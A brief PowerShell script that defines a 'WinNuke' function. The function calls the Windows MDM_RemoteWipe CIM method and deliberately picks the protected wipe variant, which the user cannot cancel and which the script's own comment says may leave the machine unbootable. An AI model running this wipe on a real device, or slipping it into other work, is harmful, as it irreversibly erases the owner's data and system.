$script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')

function WinNuke() {
	#Reset Windows
	$namespaceName = "root\cimv2\mdm\dmmap"
	$className = "MDM_RemoteWipe"
	#$methodName = "doWipeMethod" #can be canceled by the user
	$methodName = "doWipeProtectedMethod" #possibly unbootable
	$session = New-CimSession
	$params = New-Object Microsoft.Management.Infrastructure.CimMethodParametersCollection
	$param = [Microsoft.Management.Infrastructure.CimMethodParameter]::Create("param", "", "String", "In")
	$params.Add($param)
	$instance = Get-CimInstance -Namespace $namespaceName -ClassName $className -Filter "ParentID='./Vendor/MSFT' and InstanceID='RemoteWipe'"
	$session.InvokeMethod($namespaceName, $instance, $methodName, $params)
}


write-host "$name loaded..." -ForegroundColor yellow -BackgroundColor black
